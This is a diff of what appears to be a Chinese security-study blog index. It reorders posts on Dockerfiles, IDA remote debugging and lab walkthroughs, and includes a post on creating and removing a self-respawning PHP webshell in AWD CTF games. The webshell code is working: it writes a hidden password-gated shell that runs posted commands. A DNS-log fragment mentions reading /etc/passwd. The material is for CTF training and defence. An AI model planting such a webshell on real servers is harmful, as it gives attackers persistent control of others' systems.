@@ -350,37 +350,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Dockerfile的编写</title>
-    <url>/Dockerfile%E7%9A%84%E7%BC%96%E5%86%99/</url>
-    <content><![CDATA[<p>Dockerfile的保留字指令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM #基础镜像，当前新镜像是基于哪个镜像的</span><br><span class="line">MAINTAINER #镜像维护者的姓名和邮箱</span><br><span class="line">RUN #容器构建时需要运行的命令</span><br><span class="line">EXPOSE #当前容器对外暴露出的端口</span><br><span class="line">WORKDIR #指定在创建容器后，终端默认登陆的工作目录</span><br><span class="line">ENV #构建镜像过程中设置环境变量</span><br><span class="line">ADD #将宿主机目录下的文件拷贝到镜像且自定处理解压缩</span><br><span class="line">COPY #将宿主机目录下的文件拷贝到镜像，COPY src dest(COPY [&quot;src&quot;,&quot;dest&quot;])</span><br><span class="line">VOLUME #容器数据卷</span><br><span class="line">CMD #指定容器启动时要运行的命令，如有多个CMD时会只执行最后一个命令，其参数会被/bin/bash替换</span><br><span class="line">ENTRYPOINT #指定容器启动时要运行的命令，如有多个命令则在后面追加</span><br><span class="line">ONBUILD #当构建一个被继承的Dockerfile时运行命令，父镜像在被子继承后，父镜像的onbuild会被触发</span><br></pre></td></tr></table></figure>
-<p>Docker Hub中99%的镜像都是通过在base镜像中安装和配置需要的软件构建出来的。</p>
-<h1 id="Test1"><a href="#Test1" class="headerlink" title="Test1:"></a>Test1:</h1><p>编写</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line">MAINTAINER Rj45@mp.com</span><br><span class="line">ENV MYPATH /home</span><br><span class="line">WORKDIR $MYPATH</span><br><span class="line">RUN apt-get install vim -y</span><br><span class="line">RUN apt-get install net-tools -y</span><br><span class="line">EXPOSE 80</span><br><span class="line">CMD echo $MYPATH</span><br><span class="line">CMD echo &quot;Success&quot;</span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure>
-<p>构建</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -f Dockerfile -t image_name/tag .</span><br></pre></td></tr></table></figure>
-<p>运行</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it image_name/tag /bin/bash</span><br><span class="line">docker run -d image_name/tag</span><br></pre></td></tr></table></figure>
-<h1 id="Test2"><a href="#Test2" class="headerlink" title="Test2"></a>Test2</h1><p>构建</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line">RUN apt-get install curl -y</span><br><span class="line"># CMD [&quot;curl&quot;,&quot;-s&quot;,&quot;http://ip.cn&quot;]</span><br><span class="line">ENTRYPOINT [&quot;curl&quot;,&quot;-s&quot;,&quot;http://ip.cn&quot;]</span><br></pre></td></tr></table></figure>
-<p>运行</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run image_name -i</span><br></pre></td></tr></table></figure>
-<h1 id="Test3"><a href="#Test3" class="headerlink" title="Test3"></a>Test3</h1><p>构建<br>father</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line">RUN apt-get install curl -y</span><br><span class="line">ENTRYPOINT [&quot;curl&quot;,&quot;-s&quot;,&quot;http://ip.cn&quot;]</span><br><span class="line">ONBUILD RUN echo &quot;father image onbuild&quot;</span><br></pre></td></tr></table></figure>
-
-<p>运行</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -f Dockerfile -t father_name .</span><br></pre></td></tr></table></figure>
-
-<p>构建son</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM father_name</span><br><span class="line">RUN apt-get install curl -y</span><br><span class="line"># CMD [&quot;curl&quot;,&quot;-s&quot;,&quot;http://ip.cn&quot;]</span><br><span class="line">ENTRYPOINT [&quot;curl&quot;,&quot;-s&quot;,&quot;http://ip.cn&quot;]</span><br></pre></td></tr></table></figure>
-<p>运行后会打印”father image onbuild”。</p>
-<h1 id="Test4"><a href="#Test4" class="headerlink" title="Test4"></a>Test4</h1><p>构建自定义tomcat<br>在自定义路径放置目标c.txt压缩包apache-tomcat-9.0.8.tar.gz和jdk1.8.0_171-linux.tar.gz</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line">MAINTAINER Rj45@mp.com</span><br><span class="line">COPY c.txt /usr/local/cincontainer.txt</span><br><span class="line">ADD apache-tomcat-9.0.8.tar.gz /usr/local</span><br><span class="line">ADD jdk1.8.0_171-linux.tar.gz /usr/local</span><br><span class="line">RUN apt-get install vim -y</span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line">WORKDIR $MYPATH</span><br><span class="line">ENV JAVA_HOME /usr/local/jdk1.8.0_171</span><br><span class="line">ENV CLASSPATH $JAVA_HOME/LIB/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line">ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.8</span><br><span class="line">ENV CATALIME_BASE /usr/local/apache-tomcat-9.0.8</span><br><span class="line">ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin</span><br><span class="line">EXPOSE 8080</span><br><span class="line">#ENTRYPOINT [&quot;/usr/local/apache-tomcat-9.0.8/bin/startup.sh&quot;]</span><br><span class="line">#CMD [&quot;/usr/local/apache-tomcat-9.0.8/bin/catalina.sh&quot;,&quot;run&quot;]</span><br><span class="line">CMD /usr/local/apache-tomcat-9.0.8/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-9.0.8/bin/logs/catalina.out</span><br></pre></td></tr></table></figure>
-<p>构建</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -t image_name</span><br></pre></td></tr></table></figure>
-]]></content>
-  </entry>
-  <entry>
     <title>DNS-log-让数据通过DNS解析日志传回来</title>
     <url>/DNS-log/</url>
     <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近在熟悉PoC的编写，对PoC遵循的<code>无损扫描</code>和<code>减少误报漏报</code>的原则特别深刻。</p>
@@ -438,6 +407,37 @@
 <p>尽管<code>secure_file_priv=NULL</code>意味着<code>load_file</code>不能加载文件，可是在某次测试的过程中，我发现还是可以把某些如<code>/etc/passwd</code>文件或/tmp目录下的文件导入，所以设想假如把DNS带外攻击的payload导出到/tmp目录，然后导入执行，或许可以达到攻击的目的。<del>设想的过程尚未做实验验证</del></p>
 <h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p> <a href="https://www.cnblogs.com/rnss/p/11320305.html" target="_blank" rel="noopener">https://www.cnblogs.com/rnss/p/11320305.html</a> </p>
 <p>另，关于DNS-log的应用，还有很多技巧，具体可参考【ceye平台介绍】</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Dockerfile的编写</title>
+    <url>/Dockerfile%E7%9A%84%E7%BC%96%E5%86%99/</url>
+    <content><![CDATA[<p>Dockerfile的保留字指令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM #基础镜像，当前新镜像是基于哪个镜像的</span><br><span class="line">MAINTAINER #镜像维护者的姓名和邮箱</span><br><span class="line">RUN #容器构建时需要运行的命令</span><br><span class="line">EXPOSE #当前容器对外暴露出的端口</span><br><span class="line">WORKDIR #指定在创建容器后，终端默认登陆的工作目录</span><br><span class="line">ENV #构建镜像过程中设置环境变量</span><br><span class="line">ADD #将宿主机目录下的文件拷贝到镜像且自定处理解压缩</span><br><span class="line">COPY #将宿主机目录下的文件拷贝到镜像，COPY src dest(COPY [&quot;src&quot;,&quot;dest&quot;])</span><br><span class="line">VOLUME #容器数据卷</span><br><span class="line">CMD #指定容器启动时要运行的命令，如有多个CMD时会只执行最后一个命令，其参数会被/bin/bash替换</span><br><span class="line">ENTRYPOINT #指定容器启动时要运行的命令，如有多个命令则在后面追加</span><br><span class="line">ONBUILD #当构建一个被继承的Dockerfile时运行命令，父镜像在被子继承后，父镜像的onbuild会被触发</span><br></pre></td></tr></table></figure>
+<p>Docker Hub中99%的镜像都是通过在base镜像中安装和配置需要的软件构建出来的。</p>
+<h1 id="Test1"><a href="#Test1" class="headerlink" title="Test1:"></a>Test1:</h1><p>编写</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line">MAINTAINER Rj45@mp.com</span><br><span class="line">ENV MYPATH /home</span><br><span class="line">WORKDIR $MYPATH</span><br><span class="line">RUN apt-get install vim -y</span><br><span class="line">RUN apt-get install net-tools -y</span><br><span class="line">EXPOSE 80</span><br><span class="line">CMD echo $MYPATH</span><br><span class="line">CMD echo &quot;Success&quot;</span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure>
+<p>构建</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -f Dockerfile -t image_name/tag .</span><br></pre></td></tr></table></figure>
+<p>运行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it image_name/tag /bin/bash</span><br><span class="line">docker run -d image_name/tag</span><br></pre></td></tr></table></figure>
+<h1 id="Test2"><a href="#Test2" class="headerlink" title="Test2"></a>Test2</h1><p>构建</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line">RUN apt-get install curl -y</span><br><span class="line"># CMD [&quot;curl&quot;,&quot;-s&quot;,&quot;http://ip.cn&quot;]</span><br><span class="line">ENTRYPOINT [&quot;curl&quot;,&quot;-s&quot;,&quot;http://ip.cn&quot;]</span><br></pre></td></tr></table></figure>
+<p>运行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run image_name -i</span><br></pre></td></tr></table></figure>
+<h1 id="Test3"><a href="#Test3" class="headerlink" title="Test3"></a>Test3</h1><p>构建<br>father</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line">RUN apt-get install curl -y</span><br><span class="line">ENTRYPOINT [&quot;curl&quot;,&quot;-s&quot;,&quot;http://ip.cn&quot;]</span><br><span class="line">ONBUILD RUN echo &quot;father image onbuild&quot;</span><br></pre></td></tr></table></figure>
+
+<p>运行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -f Dockerfile -t father_name .</span><br></pre></td></tr></table></figure>
+
+<p>构建son</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM father_name</span><br><span class="line">RUN apt-get install curl -y</span><br><span class="line"># CMD [&quot;curl&quot;,&quot;-s&quot;,&quot;http://ip.cn&quot;]</span><br><span class="line">ENTRYPOINT [&quot;curl&quot;,&quot;-s&quot;,&quot;http://ip.cn&quot;]</span><br></pre></td></tr></table></figure>
+<p>运行后会打印”father image onbuild”。</p>
+<h1 id="Test4"><a href="#Test4" class="headerlink" title="Test4"></a>Test4</h1><p>构建自定义tomcat<br>在自定义路径放置目标c.txt压缩包apache-tomcat-9.0.8.tar.gz和jdk1.8.0_171-linux.tar.gz</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line">MAINTAINER Rj45@mp.com</span><br><span class="line">COPY c.txt /usr/local/cincontainer.txt</span><br><span class="line">ADD apache-tomcat-9.0.8.tar.gz /usr/local</span><br><span class="line">ADD jdk1.8.0_171-linux.tar.gz /usr/local</span><br><span class="line">RUN apt-get install vim -y</span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line">WORKDIR $MYPATH</span><br><span class="line">ENV JAVA_HOME /usr/local/jdk1.8.0_171</span><br><span class="line">ENV CLASSPATH $JAVA_HOME/LIB/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line">ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.8</span><br><span class="line">ENV CATALIME_BASE /usr/local/apache-tomcat-9.0.8</span><br><span class="line">ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin</span><br><span class="line">EXPOSE 8080</span><br><span class="line">#ENTRYPOINT [&quot;/usr/local/apache-tomcat-9.0.8/bin/startup.sh&quot;]</span><br><span class="line">#CMD [&quot;/usr/local/apache-tomcat-9.0.8/bin/catalina.sh&quot;,&quot;run&quot;]</span><br><span class="line">CMD /usr/local/apache-tomcat-9.0.8/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-9.0.8/bin/logs/catalina.out</span><br></pre></td></tr></table></figure>
+<p>构建</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -t image_name</span><br></pre></td></tr></table></figure>
 ]]></content>
   </entry>
   <entry>
@@ -838,26 +838,6 @@ else
 https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]></content>
   </entry>
   <entry>
-    <title>IDA远程调试环境搭建</title>
-    <url>/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1.png" alt><br>噢,美丽的IDA远程动态调试界面！！！<br>我爱了，这个七夕。</p>
-<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>软件：IDA(安装在Windows系统)<br>主机：Ubuntu18-amd64<br>程序：bugku之pwn2</p>
-<h1 id="将IDA中linux-server和linux-server64复制到Ubuntu"><a href="#将IDA中linux-server和linux-server64复制到Ubuntu" class="headerlink" title="将IDA中linux_server和linux_server64复制到Ubuntu"></a>将IDA中linux_server和linux_server64复制到Ubuntu</h1><p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/2.png" alt><br>给予权限777<br><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.png" alt></p>
-<h1 id="IDA打开程序，F2下断点"><a href="#IDA打开程序，F2下断点" class="headerlink" title="IDA打开程序，F2下断点"></a>IDA打开程序，F2下断点</h1><p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/4.png" alt></p>
-<p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/5.png" alt></p>
-<h1 id="Ubuntu中运行linux-server64"><a href="#Ubuntu中运行linux-server64" class="headerlink" title="Ubuntu中运行linux_server64"></a>Ubuntu中运行linux_server64</h1><p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/6.png" alt></p>
-<p>因被调试程序为64位，故运行linux_server64，打开了23946端口。</p>
-<h1 id="IDA设置远程调试参数"><a href="#IDA设置远程调试参数" class="headerlink" title="IDA设置远程调试参数"></a>IDA设置远程调试参数</h1><p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/7.png" alt></p>
-<p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/8.png" alt></p>
-<p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/9.png" alt></p>
-<h1 id="调试测试"><a href="#调试测试" class="headerlink" title="调试测试"></a>调试测试</h1><p>断点/取消断点F2<br>运行程序F9<br>单步跨过函数F8<br>单步进入函数F7<br>运行到选中位置F4</p>
-<p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/10.png" alt></p>
-<p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/11.png" alt></p>
-<h1 id="界面介绍"><a href="#界面介绍" class="headerlink" title="界面介绍"></a>界面介绍</h1><p>在调试模式下主要使用到的窗口：</p>
-<p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/12.png" alt></p>
-]]></content>
-  </entry>
-  <entry>
     <title>IIS历史漏洞合集（有价值部分）</title>
     <url>/IIS/</url>
     <content><![CDATA[<h2 id="0x00-IIS"><a href="#0x00-IIS" class="headerlink" title="0x00 IIS"></a>0x00 IIS</h2><p>​    IIS是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。</p>
@@ -902,6 +882,26 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 ]]></content>
   </entry>
   <entry>
+    <title>IDA远程调试环境搭建</title>
+    <url>/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1.png" alt><br>噢,美丽的IDA远程动态调试界面！！！<br>我爱了，这个七夕。</p>
+<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>软件：IDA(安装在Windows系统)<br>主机：Ubuntu18-amd64<br>程序：bugku之pwn2</p>
+<h1 id="将IDA中linux-server和linux-server64复制到Ubuntu"><a href="#将IDA中linux-server和linux-server64复制到Ubuntu" class="headerlink" title="将IDA中linux_server和linux_server64复制到Ubuntu"></a>将IDA中linux_server和linux_server64复制到Ubuntu</h1><p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/2.png" alt><br>给予权限777<br><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.png" alt></p>
+<h1 id="IDA打开程序，F2下断点"><a href="#IDA打开程序，F2下断点" class="headerlink" title="IDA打开程序，F2下断点"></a>IDA打开程序，F2下断点</h1><p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/4.png" alt></p>
+<p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/5.png" alt></p>
+<h1 id="Ubuntu中运行linux-server64"><a href="#Ubuntu中运行linux-server64" class="headerlink" title="Ubuntu中运行linux_server64"></a>Ubuntu中运行linux_server64</h1><p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/6.png" alt></p>
+<p>因被调试程序为64位，故运行linux_server64，打开了23946端口。</p>
+<h1 id="IDA设置远程调试参数"><a href="#IDA设置远程调试参数" class="headerlink" title="IDA设置远程调试参数"></a>IDA设置远程调试参数</h1><p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/7.png" alt></p>
+<p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/8.png" alt></p>
+<p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/9.png" alt></p>
+<h1 id="调试测试"><a href="#调试测试" class="headerlink" title="调试测试"></a>调试测试</h1><p>断点/取消断点F2<br>运行程序F9<br>单步跨过函数F8<br>单步进入函数F7<br>运行到选中位置F4</p>
+<p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/10.png" alt></p>
+<p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/11.png" alt></p>
+<h1 id="界面介绍"><a href="#界面介绍" class="headerlink" title="界面介绍"></a>界面介绍</h1><p>在调试模式下主要使用到的窗口：</p>
+<p><img src="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/12.png" alt></p>
+]]></content>
+  </entry>
+  <entry>
     <title>Kioptrix_Level_1靶机渗透</title>
     <url>/Kioptrix-Level-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
     <content><![CDATA[<h2 id="主机存活"><a href="#主机存活" class="headerlink" title="主机存活"></a>主机存活</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure>
@@ -940,16 +940,6 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 <p>提权成功</p>
 <h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><p><img src="/Kioptrix-Level-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/23.png" alt></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>Shiro-rememberMe-反序列化-RCE</title>
-    <url>/Shiro-rememberMe/</url>
-    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><h2 id="0x02-漏洞"><a href="#0x02-漏洞" class="headerlink" title="0x02 漏洞"></a>0x02 漏洞</h2><p>1、影响版本</p>
-<p>2、漏洞摘要</p>
-<h2 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03 分析"></a>0x03 分析</h2><p>1、漏洞点</p>
-<p>2、输入点</p>
-<p>3、利用点</p>
-<h2 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04 EXP"></a>0x04 EXP</h2><h2 id="0x05-修复"><a href="#0x05-修复" class="headerlink" title="0x05 修复"></a>0x05 修复</h2><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2>]]></content>
   </entry>
   <entry>
     <title>attack-to-tomcat</title>
@@ -1014,6 +1004,39 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 ]]></content>
   </entry>
   <entry>
+    <title>不死马的创建和查杀</title>
+    <url>/bushima/</url>
+    <content><![CDATA[<h2 id="0x00-创建"><a href="#0x00-创建" class="headerlink" title="0x00 创建"></a>0x00 创建</h2><p>md5加密密码：</p>
+<p><img src="/bushima/image-20191227151103533.png" alt="image-20191227151103533"></p>
+<p>代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">$file = <span class="string">'.shell.php'</span>;</span><br><span class="line">$code = <span class="string">'&lt;?php if(md5($_GET["pass"])=="2591c98b70119fe624898b1e424b5e91")&#123;@system($_POST[cmd]);&#125; ?&gt;'</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents($file,$code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>触发执行：</p>
+<p><img src="/bushima/image-20191227150551537.png" alt="image-20191227150551537"></p>
+<h2 id="0x01-查看"><a href="#0x01-查看" class="headerlink" title="0x01 查看"></a>0x01 查看</h2><p>权限：</p>
+<p><img src="/bushima/image-20191227150829131.png" alt="image-20191227150829131"></p>
+<p>内容：</p>
+<p><img src="/bushima/image-20191227150919724.png" alt="image-20191227150919724"></p>
+<p>执行：</p>
+<p><img src="/bushima/image-20191227151155617.png" alt="image-20191227151155617"></p>
+<h2 id="0x02-查杀"><a href="#0x02-查杀" class="headerlink" title="0x02 查杀"></a>0x02 查杀</h2><p><strong>root用户角度的查杀：</strong></p>
+<p>1、杀掉进程</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ps aux | grep www-data | awk <span class="string">'&#123;print $2&#125;'</span> | xargs kill <span class="number">-9</span></span><br></pre></td></tr></table></figure>
+
+<p>2、重启服务</p>
+<p>重启web服务。</p>
+<p><strong>其他用户的查杀：</strong></p>
+<p>在awd中，ctf用户没有权限，不能重启服务，而且，以ctf的用户来杀进程和条件竞争也是不可行的。</p>
+<p>（不死马会先创建，然后被删除，在创建到被删除的过程中会可利用。）</p>
+<p>最简单的方式就是以www-data用户的角度通过杀进程来实现查杀。</p>
+<p>1、杀掉进程：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@system(&quot;ps -aux | grep www-data | awk &apos;&#123;print $2&#125;&apos; | xargs kill -9&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2、条件竞争：</p>
+<p>不推荐，如果不死马中没有调用<code>usleep()</code>函数，进行延时的话，条件竞争是gg的。</p>
+]]></content>
+  </entry>
+  <entry>
     <title>awd-platform的搭建</title>
     <url>/awd-platform%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
     <content><![CDATA[<p><a href="https://github.com/zhl2008/awd-platform.git" target="_blank" rel="noopener">awd-platform平台是一个开源的AWD训练项目。</a></p>
@@ -1051,39 +1074,6 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 <h1 id="关闭比赛"><a href="#关闭比赛" class="headerlink" title="关闭比赛"></a>关闭比赛</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python stop_clean.py</span><br></pre></td></tr></table></figure>
 <p><img src="/awd-platform%E7%9A%84%E6%90%AD%E5%BB%BA/14.png" alt></p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.heibai.org/post/1468.html" target="_blank" rel="noopener">https://www.heibai.org/post/1468.html</a><br><a href="https://www.cnblogs.com/pureqh/p/10869327.html" target="_blank" rel="noopener">https://www.cnblogs.com/pureqh/p/10869327.html</a><br><a href="https://cloud.tencent.com/developer/article/1423407" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1423407</a><br><a href="https://blog.csdn.net/huanghelouzi/article/details/90204325" target="_blank" rel="noopener">https://blog.csdn.net/huanghelouzi/article/details/90204325</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>不死马的创建和查杀</title>
-    <url>/bushima/</url>
-    <content><![CDATA[<h2 id="0x00-创建"><a href="#0x00-创建" class="headerlink" title="0x00 创建"></a>0x00 创建</h2><p>md5加密密码：</p>
-<p><img src="/bushima/image-20191227151103533.png" alt="image-20191227151103533"></p>
-<p>代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">$file = <span class="string">'.shell.php'</span>;</span><br><span class="line">$code = <span class="string">'&lt;?php if(md5($_GET["pass"])=="2591c98b70119fe624898b1e424b5e91")&#123;@system($_POST[cmd]);&#125; ?&gt;'</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents($file,$code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>触发执行：</p>
-<p><img src="/bushima/image-20191227150551537.png" alt="image-20191227150551537"></p>
-<h2 id="0x01-查看"><a href="#0x01-查看" class="headerlink" title="0x01 查看"></a>0x01 查看</h2><p>权限：</p>
-<p><img src="/bushima/image-20191227150829131.png" alt="image-20191227150829131"></p>
-<p>内容：</p>
-<p><img src="/bushima/image-20191227150919724.png" alt="image-20191227150919724"></p>
-<p>执行：</p>
-<p><img src="/bushima/image-20191227151155617.png" alt="image-20191227151155617"></p>
-<h2 id="0x02-查杀"><a href="#0x02-查杀" class="headerlink" title="0x02 查杀"></a>0x02 查杀</h2><p><strong>root用户角度的查杀：</strong></p>
-<p>1、杀掉进程</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ps aux | grep www-data | awk <span class="string">'&#123;print $2&#125;'</span> | xargs kill <span class="number">-9</span></span><br></pre></td></tr></table></figure>
-
-<p>2、重启服务</p>
-<p>重启web服务。</p>
-<p><strong>其他用户的查杀：</strong></p>
-<p>在awd中，ctf用户没有权限，不能重启服务，而且，以ctf的用户来杀进程和条件竞争也是不可行的。</p>
-<p>（不死马会先创建，然后被删除，在创建到被删除的过程中会可利用。）</p>
-<p>最简单的方式就是以www-data用户的角度通过杀进程来实现查杀。</p>
-<p>1、杀掉进程：</p>
